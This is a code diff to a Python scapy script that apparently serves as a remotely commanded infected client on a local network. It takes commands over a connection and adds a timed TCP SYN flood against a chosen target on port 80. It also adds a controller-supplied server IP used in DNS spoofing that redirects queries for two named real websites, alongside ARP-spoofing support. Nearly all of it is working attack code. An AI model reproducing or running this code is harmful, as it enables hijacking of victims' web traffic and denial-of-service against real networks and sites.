@@ -1,11 +1,12 @@
 from scapy.all import*
 from scapy.layers.dns import DNSRR, DNS, DNSQR
-from scapy.layers.inet import IP, UDP
+from scapy.layers.inet import IP, UDP, TCP
 from scapy.layers.l2 import ARP, Ether
 import subprocess
 import socket
 import time
 import threading
+from datetime import datetime, timedelta
 
 DIGITS = ["1","2","3","4","5","6","7","8","9","0"]
 
@@ -20,6 +21,8 @@ def get_configs():
     result = str(result).replace("\\r\\n", "")
     result = result.split("  ")
 
+    defaultg = False
+
     ip = ""
     ip_line = ""
     subnet_line = ""
@@ -27,6 +30,10 @@ def get_configs():
 
     # finds the first ip and subnet
     for line in result:
+        if defaultg:
+            if line.find(".") != -1:
+                default_gateway = line
+                defaultg = False
         if line.find("IPv4") != -1:
             ip_line = line
             ip = ip_line.split(":")[1].strip()
@@ -34,10 +41,14 @@ def get_configs():
             subnet_line = line
         elif line.find("Default Gateway") != -1 and my_ip == ip:
             default_gateway = line
+            default_gateway = default_gateway.split(":")[1].strip().replace("'", "")
+            if len(default_gateway) < 5:
+                default_gateway = ""
+                defaultg = True
+
         if default_gateway and subnet_line:
             break
 
-    default_gateway = default_gateway.split(":")[1].strip().replace("'", "")
     default_gateway_ip = ""
     for c in default_gateway:
         if c in DIGITS or c == ".":
@@ -52,7 +63,6 @@ def get_configs():
         sum_bin += bin(int(i)).count("1")
 
     return ip, str(sum_bin), default_gateway_ip
-
 
 # scan for active devices on the network
 def scan(ip, subnet, gateway):
@@ -179,9 +189,8 @@ def change_packet(pkt):
     global spoofed
     # get the real name of the query
     real_name = pkt[DNSQR].qname.decode()[:-1]
-    fake_ip = ip
+    fake_ip = srv
     # if the victim entered the given website, change the packet
-    print(real_name)
     if real_name in ["www.rabincenter.org.il", "www.sribersriber.com"]:
         spoofed = True
         # create a reply to the query with the same name but a different ip
@@ -196,6 +205,28 @@ def change_packet(pkt):
         del pkt[UDP].chksum
         return spoofed_pkt, spoofed
     return pkt, spoofed
+
+
+# waits until the attack date is reached
+def attack(time, target):
+    try:
+        while datetime.now() < datetime.strptime(time, "%Y-%m-%d %H:%M:%S"):
+            pass
+        tcp_flood(target)
+    except Exception as e:
+        pass
+
+
+# tcp flooding an ip on port 80 to interrupt internet connections
+def tcp_flood(target):
+    end = time.time() + 60
+    dst_port = 80
+    ip_layer = IP(dst=target)
+    # bulid a syn tcp packet
+    tcp_layer = TCP(sport=RandShort(), dport=dst_port, flags="S")
+    packet = ip_layer / tcp_layer
+    while time.time() < end:
+        send(packet, verbose=0)
 
 
 def main_infect(conn):
@@ -230,8 +261,9 @@ def main_infect(conn):
             elif command.find("spoof") != -1:
                 chosen_ip = conn.recv()
                 chosen_mac = conn.recv()
-                if not chosen_mac:
-                    chosen_mac = scan_host(chosen_ip)
+                global srv
+                srv = conn.recv()
+                chosen_mac = scan_host(chosen_ip)
                 if chosen_mac:
                     try:
                         # creates a spoofing thread
@@ -248,3 +280,8 @@ def main_infect(conn):
                 else:
                     conn.send("Doesn't have mac")
 
+            elif command.find("attack") != -1:
+                attack_time = conn.recv()
+                target = conn.recv()
+                attack_thread = threading.Thread(target=attack, args=(attack_time,target,))
+                attack_thread.start()
